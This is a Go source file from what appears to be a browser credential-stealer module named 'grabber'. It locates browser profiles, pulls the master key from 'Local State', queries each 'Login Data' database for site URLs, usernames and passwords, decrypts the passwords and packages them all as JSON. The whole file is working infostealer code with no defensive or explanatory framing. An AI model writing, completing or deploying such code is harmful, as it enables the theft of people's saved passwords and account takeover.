package pass

import (
	"database/sql"
	"encoding/json"
	"os"

	"example.com/grabber/browsers/util"
	"example.com/grabber/decryption"
	_ "github.com/mattn/go-sqlite3"
)

type Passwords struct {
	OriginURL string `json:"origin_url"`
	Username  string `json:"username"`
	Password  string `json:"password"`
}

func Get() string {
	var passwords []Passwords
	dpPaths := util.GetBPth()
	extraPaths := util.GetProfiles()
	for _, path := range dpPaths {
		// check if the path exists
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}
		master_key := decryption.GetMasterKey(path + "\\Local State")
		for _, profile := range extraPaths {
			if _, err := os.Stat(path + "\\" + profile); os.IsNotExist(err) {
				continue
			}
			path = path + "\\" + profile
			db, err := sql.Open("sqlite3", path+"\\Login Data")
			if err != nil {
				continue
			}
			defer db.Close()

			row, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
			if err != nil {
				continue
			}
			defer row.Close()

			for row.Next() {
				var origin_url string
				var username_value string
				var password_value []byte
				row.Scan(&origin_url, &username_value, &password_value)
				decrypted, err := decryption.DecryptPassword(password_value, master_key)
				if err != nil {
					decrypted = string(password_value)
				}
				passwords = append(passwords, Passwords{origin_url, username_value, decrypted})
			}
		}
	}
	jsonData, err := json.MarshalIndent(passwords, "", "    ")
	if err != nil {
		return ""
	}
	return string(jsonData)
}
